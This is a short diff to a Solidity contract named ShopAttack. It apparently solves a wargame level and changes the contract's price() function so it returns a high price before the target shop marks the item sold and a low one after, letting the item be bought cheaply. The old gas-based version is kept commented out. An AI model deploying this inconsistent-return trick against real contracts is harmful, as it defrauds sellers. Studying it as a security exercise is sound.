@@ -38,11 +38,15 @@ contract ShopAttack {
     // is to use the gas left.
     // The first call will have a lot of gas left,
     // the second call will have a lot less gas left.
-    function price() external view returns (uint) {
-        if (gasleft() > 30000) {
-            return 1000;
-        } else {
-            return 1;
-        }
+    // Can also check shop.isSold() to see if it has been sold yet.
+    function price() external view returns (uint price_) {
+        price_ = shop.isSold() ? 1 : 1000;
     }
+    // function price() external view returns (uint) {
+    //     if (gasleft() > 30000) {
+    //         return 1000;
+    //     } else {
+    //         return 1;
+    //     }
+    // }
 }
